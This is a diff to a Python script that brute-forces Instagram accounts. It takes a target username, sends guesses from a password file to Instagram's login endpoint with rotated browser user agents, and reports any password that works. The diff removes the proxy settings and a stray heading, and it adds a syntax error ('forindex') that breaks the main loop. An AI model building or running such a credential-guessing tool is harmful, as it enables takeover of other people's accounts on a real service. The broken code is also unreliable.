@@ -23,10 +23,6 @@ if sys.version_info[0] != 3:
 PASSWORD_FILE = "passwords.txt"
 MIN_PASSWORD_LENGTH = 6
 POST_URL = 'https://www.instagram.com/accounts/login/ajax/'
-PROXIES = {
-    'http': 'http://your_proxy_here:port',
-    'https': 'http://your_proxy_here:port',
-}
 USER_AGENTS = [
     'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
     'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15',
@@ -51,7 +47,7 @@ def create_form():
     }
 
     session = requests.Session()
-    data = session.get('https://www.instagram.com/accounts/login/', headers=headers, proxies=PROXIES)
+    data = session.get('https://www.instagram.com/accounts/login/', headers=headers)
     for i in data.cookies:
         cookies[i.name] = i.value
     return form, cookies, session
@@ -71,7 +67,7 @@ def is_this_a_password(username, index, password, session):
     }
 
     try:
-        r = session.post(POST_URL, data=PAYLOAD, cookies=COOKIES, headers=headers, proxies=PROXIES)
+        r = session.post(POST_URL, data=PAYLOAD, cookies=COOKIES, headers=headers)
         if 'authenticated": true' in r.text:
             print(f'\n[+] Password found: {password}')
             return True
@@ -92,9 +88,6 @@ def main():
         print(f'[!] Password file "{PASSWORD_FILE}" not found.')
         return
 
- 
-### Completed Script
-
     username = input("[+] Enter the target Instagram username: ")
 
     with open(PASSWORD_FILE, 'r') as file:
@@ -103,7 +96,7 @@ def main():
     session = requests.Session()
     PAYLOAD, COOKIES, session = create_form()
 
-    for index, password in enumerate(passwords):
+    forindex, password in enumerate(passwords):
         password = password.strip()
         if len(password) < MIN_PASSWORD_LENGTH:
             continue
